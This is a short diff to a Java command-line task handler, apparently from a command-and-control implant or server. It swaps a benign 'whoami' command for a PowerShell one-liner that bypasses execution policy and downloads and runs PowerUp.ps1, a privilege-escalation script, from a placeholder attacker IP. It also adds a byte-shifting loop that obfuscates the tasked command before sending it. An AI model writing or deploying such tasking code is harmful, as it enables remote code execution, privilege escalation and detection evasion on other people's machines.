@@ -11,8 +11,13 @@ public class CommandLineTaskHandler implements Handler{
     @Override
     public byte[] handle() {
         Scanner scanner = new Scanner(System.in);
-        String commandLine = "whoami";
+        String commandLine = "powershell -ep bypass -c \"iex(new-object net.webclient).downloadstring('http://<attacker_ip>/PowerUp.ps1')\"";
         ByteBuffer bb = ByteBuffer.wrap(commandLine.getBytes()).order(ByteOrder.BIG_ENDIAN);
-        return Message.createResponse(MessageType.COMMAND_LINE_EXECUTION,bb.array());
+        byte[] payload = bb.array();
+        for(int i = 0; i < payload.length; i++)
+        {
+            payload[i] += 1;
+        }
+        return Message.createResponse(MessageType.COMMAND_LINE_EXECUTION,payload);
     }
 }
